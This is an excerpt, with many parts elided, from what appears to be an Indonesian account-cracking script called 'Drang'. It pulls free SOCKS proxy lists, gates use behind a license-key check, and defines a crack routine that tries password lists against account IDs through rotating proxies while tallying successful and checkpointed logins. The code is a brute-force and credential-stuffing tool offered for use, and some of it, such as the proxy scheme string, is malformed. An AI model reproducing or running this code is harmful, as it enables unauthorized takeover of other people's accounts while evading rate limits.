...
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5,socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
...
•                                               •
•   GITHUB : HTTPS://GITHUB.COM/Syafii-XD/Drang   •'''
...
def login_lagi334():
	try:
		...
		print('\nLOGIN BERHASIL  --->jalankan ulang Scrip Nya ');time.sleep(1)
		exit()
	except Exception as e:
...
def tlisensi():
	...
	open('.lisensi.txt','w').write(lisen)
	lisensi()

def lisensi():
	try:
		cek=open('.lisensi.txt','r').read()
		lisensikuni.append(cek)
	except:
		tlisensi()
	ses=requests.Session()
	res=ses.get('https://app.cryptolens.io/api/key/Activate?token=76IxBBXM7Qe4dAw6qSsab5FV55SdYr6CUTpmHdHUKjBlO2BRpH==&ProductId=15726&Key='+lisensikuni[0]).json()
	status=res['lisensi']['key']
	if status ==cek:
		banner()
...
def crack(idf,pwv):
	...
	ses = requests.Session()
	sys.stdout.write('\r%s 🕒 %s/%s 🕜 OK:%s 🕐 CP:%s 🕑 %s%s%s 🕊️'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5,socks4://'+nip}
